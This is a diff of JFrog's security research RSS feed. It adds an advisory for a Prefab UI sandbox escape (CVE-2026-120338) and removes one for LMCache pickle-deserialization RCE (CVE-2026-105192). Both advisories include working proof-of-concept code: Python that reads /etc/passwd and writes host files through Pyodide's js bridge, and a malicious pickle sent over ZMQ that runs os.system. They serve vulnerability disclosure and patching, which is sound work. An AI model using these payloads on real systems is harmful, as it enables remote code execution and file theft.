@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Sun, 01 Nov 2026 13:41:58 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 01 Nov 2026 15:35:11 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -555,6 +555,146 @@ https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
 https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/prefab-ui-is-vulnerable-to-remote-code-execution-via-a-pyodide-js-bridge-to-deno-cve-2026-120338-jfsa-2026-001699278/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120338, CRITICAL, Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Prefab UI is vulnerable to Remote Code Execution via a Pyodide js Bridge to Deno
+
+
+## Component
+
+prefab-ui (github.com/PrefectHQ/prefab)
+
+## Affected versions
+
+>= 0.14.0, < 0.21.0
+
+## Description
+
+Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, which is Python compiled to WebAssembly, in a Deno subprocess. The feature is documented as isolation for untrusted code, including UI written by a model. `PyodideSandbox._start` in `src/prefab_ui/sandbox/_pyodide.py` starts that process with unrestricted `--allow-read`, `--allow-write`, and `--allow-net`. The runner in `src/prefab_ui/sandbox/runner.js` leaves the Deno API on the JavaScript global object. Pyodide's `js` module proxies that global, so the Python can call `Deno.readTextFileSync` and `Deno.writeTextFileSync` on the host. The runner comment and the public docs describe this process as read-only.
+
+The usual remote path is FastMCP's `GenerativeUI` provider. It registers the MCP tool `generate_prefab_ui` and forwards the tool's `code` argument into this sandbox. There is no extra check on that tool. On a FastMCP server with no authentication configured, any client who can reach the server can call it. With authentication, any client allowed to call tools can. The 10.0 score is the unauthenticated case. The same bug with an authenticated tool caller scores 9.9 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`). Generative UI is opt-in, and the host must have Deno installed. Servers that never execute untrusted code in this sandbox are not exposed.
+
+A caller who can submit the code can read and write files as the server OS user. On prefab-ui 0.20.2 the same write was used to plant a `.pth` file in the server virtualenv's `site-packages`, and the next Python process that used that environment ran the planted import. The sandbox shipped in 0.14.0 with those Deno permissions, and they were still present in 0.20.2. prefab-ui 0.21.0 revokes read, write, and network permission after startup, before it accepts code.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the vulnerable release**
+
+<br>
+
+Deno must be on `PATH`. The sandbox does not start without it.
+
+```
+pip install 'prefab-ui==0.20.2' 'fastmcp[apps]'
+```
+
+<br>
+
+**Step 2 - Start a FastMCP server with Generative UI and no authentication**
+
+<br>
+
+```
+from fastmcp import FastMCP
+from fastmcp.apps.generative import GenerativeUI
+
+mcp = FastMCP("poc")
+mcp.add_provider(GenerativeUI())
+mcp.run(transport="http", host="127.0.0.1", port=8127)
+```
+
+<br>
+
+**Step 3 - Call generate_prefab_ui**
+
+<br>
+
+The read returns the host file inside the rendered text. The write creates `/tmp/prefab-ui-sandbox-proof.txt`.
+
+```
+import asyncio
+from fastmcp import Client
+
+READ = """
+import js
+from prefab_ui.components import Text
+secret = js.Deno.readTextFileSync("/etc/passwd")
+leak = Text("EXFIL_BEGIN" + secret + "EXFIL_END")
+"""
+
+WRITE = """
+import js
+from prefab_ui.components import Text
+js.Deno.writeTextFileSync("/tmp/prefab-ui-sandbox-proof.txt", "owned\\n")
+done = Text("write-ok")
+"""
+
+async def main():
+    async with Client("http://127.0.0.1:8127/mcp/") as client:
+        print(await client.call_tool("generate_prefab_ui", {"code": READ}))
+        await client.call_tool("generate_prefab_ui", {"code": WRITE})
+
+asyncio.run(main())
+```
+
+<br>
+
+**Step 4 - Confirm the host file**
+
+<br>
+
+```
+cat /tmp/prefab-ui-sandbox-proof.txt
+```
+
+<br>
+
+Expected output on prefab-ui 0.20.2. The tool result contains the host passwd file between the markers, and the new file is on the host:
+
+```
+EXFIL_BEGIN
+# User Database
+...
+root:*:0:0:System Administrator:...
+EXFIL_END
+
+owned
+```
+
+<br>
+
+On prefab-ui 0.21.0 or later, the same read and write fail with a Deno permission error and do not return or create the host file.
+
+## Vulnerability Mitigations
+
+Upgrade prefab-ui to 0.21.0 or later. After the runtime and Prefab sources load, the runner revokes Deno filesystem read, filesystem write, and network permission before it accepts generated code. The process is started with `--no-prompt`, so a later permission request cannot grant them again, and bootstrap network access is limited to `cdn.jsdelivr.net:443`. FastMCP servers that register `GenerativeUI` pick up the fix by running that prefab-ui release.
+
+The change is https://github.com/PrefectHQ/prefab/pull/538, commit 030f074f85e0b1be0dd44b0283185aecb26337a2, released on 2026-10-26 as v0.21.0.
+
+Until the upgrade, do not register `GenerativeUI` on a server that untrusted clients can reach.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120338
+https://github.com/PrefectHQ/prefab/security/advisories/GHSA-595q-jv4r-q7j9
+https://github.com/PrefectHQ/prefab/pull/538
+https://github.com/PrefectHQ/prefab/commit/030f074f85e0b1be0dd44b0283185aecb26337a2
+https://github.com/PrefectHQ/prefab/releases/tag/v0.21.0
+https://pypi.org/project/prefab-ui/0.21.0/
+https://github.com/PrefectHQ/prefab/releases/tag/v0.20.2
+https://github.com/PrefectHQ/prefab/releases/tag/v0.14.0
+https://github.com/PrefectHQ/prefab
+https://pypi.org/project/prefab-ui/
 ]]></content:encoded>
         </item>
         <item>
@@ -1493,148 +1633,6 @@ JFrog Xray and JFrog Curation detect the malicious `litellm` 1.107.0 using XRAY-
 - Temporary paths: `/tmp/.pc_sq_*` and `/tmp/.pc_e_*`
 - LiteLLM database targets: `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
 - Community tracking: [open LiteLLM security issue #47826](https://github.com/BerriAI/litellm/issues/47826)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</guid>
-            <pubDate>Wed, 07 Oct 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
-
-
-## Component
-
-lmcache (github.com/LMCache/LMCache)
-
-## Affected versions
-
->= 0.3.9, < 0.5.6
-
-## Description
-
-LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.
-
-Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.
-
-The decode path shipped in v0.3.9 and is present through v0.5.5, including the v0.5.6 release candidates through v0.5.6rc3. v0.5.6, published on 2026-10-14, removes `pickle.loads` from this path.
-
-## PoC
-
-<br>
-
-**Step 1 - Start multiprocess mode bound to a routable address**
-
-<br>
-
-This is the documented multi-node setting. The ZMQ transport listens on port 5555.
-
-```
-python -m lmcache.v1.multiprocess.http_server \
-    --http-host 127.0.0.1 --http-port 8080 \
-    --host 0.0.0.0 --port 5555 \
-    --l1-size-gb 0.25 --eviction-policy LRU \
-    --hash-algorithm blake3 --instance-id mp-node-01
-```
-
-<br>
-
-**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
-
-<br>
-
-Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`.
-
-```
-import os
-import pickle
-import msgspec
-import zmq
-
-class EvilPayload:
-    def __init__(self, cmd):
-        self.cmd = cmd
-    def __reduce__(self):
-        return (os.system, (self.cmd,))
-
-evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))
-
-REGISTER_KV_CACHE = 1
-EXT_CODE = 1
-NUM_PAYLOADS = 7
-KVCACHE_INDEX = 1
-
-b_uid = msgspec.msgpack.encode(0)
-b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
-payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
-payloads[0] = msgspec.msgpack.encode(0)
-payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
-    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
-)
-frames = [b_uid, b_type, *payloads]
-```
-
-<br>
-
-**Step 3 - Send the frame**
-
-<br>
-
-```
-ctx = zmq.Context()
-s = ctx.socket(zmq.DEALER)
-s.connect("tcp://127.0.0.1:5555")
-s.send_multipart(frames)
-```
-
-<br>
-
-The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
-
-<br>
-
-**Step 4 - Confirm the command ran as the LMCache user**
-
-<br>
-
-```
-cat /tmp/zmq_pwn
-```
-
-<br>
-
-Expected output on an official image, where the process runs as root:
-
-```
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-## Vulnerability Mitigations
-
-Upgrade to LMCache 0.5.6 or later. That release replaces pickle in device IPC descriptors with versioned, typed MessagePack descriptors. Descriptors are validated before use, the wrapper type is chosen from a fixed local allowlist, and class names are never taken from the message. The change covers the ZeroMQ and gRPC paths, and there is no pickle fallback. The wire format changed, so upgrade workers and servers together. The change is https://github.com/LMCache/LMCache/pull/5644, and it is in the v0.5.6 tag.
-
-LMCache's note on the fix is https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/.
-
-Two related changes were announced with that note and merged after the v0.5.6 tag was cut (tag commit 3e11e10, 2026-10-12). They are included in v0.5.7rc2. https://github.com/LMCache/LMCache/pull/5684 binds the example Kubernetes deployment to localhost. https://github.com/LMCache/LMCache/pull/5685 runs the official images as a non-root user. The v0.5.6 example deployment still passes `--host 0.0.0.0`, and the v0.5.6 images still run as root.
-
-On any version before 0.5.6, keep the multiprocess port on localhost or on a trusted cluster network, and limit the port with a firewall. Any host that can open a connection to the port can still run code as the LMCache user.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-105192
-https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/
-https://github.com/LMCache/LMCache/security/advisories/GHSA-w5f2-9q9c-ff4h
-https://github.com/LMCache/LMCache/pull/5644
-https://github.com/LMCache/LMCache/pull/5684
-https://github.com/LMCache/LMCache/pull/5685
-https://github.com/LMCache/LMCache/releases/tag/v0.5.6
-https://github.com/LMCache/LMCache
-https://pypi.org/project/lmcache/
-https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py
-https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py
 ]]></content:encoded>
         </item>
     </channel>
